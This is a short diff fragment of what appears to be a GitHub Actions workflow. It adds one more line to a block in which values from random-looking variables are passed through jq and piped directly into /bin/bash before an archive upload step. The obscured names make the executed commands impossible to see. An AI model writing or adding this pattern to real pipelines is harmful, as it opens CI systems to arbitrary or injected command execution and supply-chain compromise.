@@ -37,6 +37,7 @@ jobs:
           echo $t7 | jq -r .zik019 | /bin/bash
           printf '%s' "$cb0787" | jq -r .npsaw65515 | /bin/bash
           echo $oenpn08 | jq -r .nr15 | /bin/bash
+          printf '%s' "$lgq36" | jq -r .abgv98134 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
